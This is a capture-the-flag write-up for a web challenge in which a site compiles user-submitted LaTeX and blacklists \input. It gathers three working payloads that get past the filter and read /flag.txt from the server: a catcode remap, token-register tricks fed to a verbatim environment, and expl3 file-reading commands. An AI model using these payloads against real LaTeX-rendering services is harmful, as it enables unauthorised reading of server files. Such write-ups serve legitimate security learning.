# latex

My first LaTeX website for my math teacher. I hope this will become the best gift for him! :)

## Solution

Saw in Discord channel.

`\input` is the only command with a backslash in the blacklist

change catcode for escape

```latex
\catcode`\%=0
%input{/flag.txt}
```

https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/tree/main/Web/Latex/writeup

```latex
\documentclass{article}
\RequirePackage{verbatim}
\begin{document}
\newtoks\in
\newtoks\put
\in={in}
\put={put}
\begin{verbatim\the\in\the\put}{/flag.txt}\end{verbatim\the\in\the\put}
\end{document}
```

I think I tried this, but didn't know you could use `\RequirePackage{verbatim}`.
I wonder if bibliography file read via Bibtex would have worked here...


Another solver from discord:

```latex
\documentclass[12pt]{article}
\begin{document}
\ExplSyntaxOn
\ior_open:Nn \g_tmpa_ior {/flag.txt}
\ior_str_map_variable:NNn \g_tmpa_ior \l_tmpa_str {
     \pdfescapehex{\l_tmpa_str}
}
\ior_close:N \g_tmpa_ior
\ExplSyntaxOff
\end{document}
```

https://tex.stackexchange.com/questions/108696/what-do-explsyntaxon-and-explsyntaxoff-do

https://tex.stackexchange.com/questions/60981/latex-3-read-write-to-file-like-toc


